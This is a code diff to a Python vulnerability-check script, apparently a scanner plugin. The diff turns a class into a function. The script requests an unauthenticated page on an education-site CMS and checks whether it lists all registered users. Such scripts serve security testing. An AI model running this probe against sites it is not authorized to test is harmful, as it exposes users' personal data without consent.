@@ -9,20 +9,13 @@ description: 文件selectunitmember.aspx未授权访问。
 import sys
 import requests
 import warnings
-
-
-
-class selectunitmember_unauth:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['易创思教育建站系统未授权访问可查看所有注册用户', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/operationmanage/selectunitmember.aspx"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"doPostBack" in req.text and r"gvUnitMember" in req.text:
@@ -37,5 +30,4 @@ class selectunitmember_unauth:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = selectunitmember_unauth(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
